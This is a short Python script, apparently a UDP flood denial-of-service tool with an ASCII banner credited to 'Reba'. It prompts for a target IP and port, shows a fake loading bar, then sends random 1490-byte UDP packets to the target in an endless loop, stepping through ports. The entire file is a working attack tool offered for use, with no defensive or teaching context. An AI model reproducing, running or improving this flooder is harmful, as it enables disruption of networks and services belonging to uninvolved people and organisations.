 print ("\033[1;31m")
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
os.system('clear')
logo = """ \n\033[1;31m  _______    _______    ______     _______ \n\033[1;31m (  ____ )  (  ____ \  (  ___ \   (  ___  )\n | (    )|  | (    \/  | (   ) )  | (   ) |\n\033[1;31m | (____)|  | (__      | (__/ /   | (___) |\n |     __)  |  __)     |  __ (    |  ___  |\n\033[1;31m | (\ (     | (        | (  \ \   | (   ) |\n | ) \ \__  | (____/\  | )___) )  | )   ( |\n\033[1;31m |/   \__/  (_______/  |/ \___/   |/     \|\n\033[1;31m--------------------------------------------------\n COD BY Reba  """

print(logo)
print
print
ip = raw_input("IP DANE : ")
port = input("Port       : ")
print("\033[93m")
print ("\033[92m")
print "[                    ] 0% "
time.sleep(3)
print "[=====               ] 25%"
time.sleep(3)
print "[==========          ] 50%"
time.sleep(3)
print "[===============     ] 75%"
time.sleep(3)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

